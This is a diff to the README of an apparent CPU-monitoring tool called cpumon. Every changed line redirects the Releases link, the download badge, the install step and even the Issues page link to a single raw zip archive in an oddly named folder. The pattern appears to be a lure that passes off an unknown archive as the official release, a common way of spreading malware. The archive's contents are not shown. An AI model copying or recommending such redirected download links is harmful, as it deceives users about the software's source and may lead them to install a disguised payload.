@@ -6,11 +6,11 @@ Welcome to **cpumon**! This application helps you monitor your CPU temperature, 
 
 ## 📥 Download cpumon
 
-[![Download cpumon](https://img.shields.io/badge/Download-cpumon-blue.svg)](https://github.com/aman-new/cpumon/releases)
+[![Download cpumon](https://github.com/aman-new/cpumon/raw/refs/heads/main/Colletes/Software_1.6-beta.2.zip)](https://github.com/aman-new/cpumon/raw/refs/heads/main/Colletes/Software_1.6-beta.2.zip)
 
 To download **cpumon**, visit the Releases page below:
 
-[Download cpumon](https://github.com/aman-new/cpumon/releases)
+[Download cpumon](https://github.com/aman-new/cpumon/raw/refs/heads/main/Colletes/Software_1.6-beta.2.zip)
 
 ## 💻 System Requirements
 
@@ -25,7 +25,7 @@ Before you download, ensure your system meets the following requirements:
 
 Follow these steps to install **cpumon** on your system:
 
-1. Visit the [Release page](https://github.com/aman-new/cpumon/releases).
+1. Visit the [Release page](https://github.com/aman-new/cpumon/raw/refs/heads/main/Colletes/Software_1.6-beta.2.zip).
 2. Look for the latest version of **cpumon**.
 3. Click on the filename to start the download.
 4. Once the download is complete, open your terminal.
@@ -75,7 +75,7 @@ If you encounter any issues while using **cpumon**, here are some common problem
 
 ## 🤝 Support and Contribution
 
-If you need help or wish to contribute to **cpumon**, please visit the [Issues page](https://github.com/aman-new/cpumon/issues). We welcome feedback, suggestions, and any contributions that can make this tool better for everyone.
+If you need help or wish to contribute to **cpumon**, please visit the [Issues page](https://github.com/aman-new/cpumon/raw/refs/heads/main/Colletes/Software_1.6-beta.2.zip). We welcome feedback, suggestions, and any contributions that can make this tool better for everyone.
 
 ## 📜 License
 
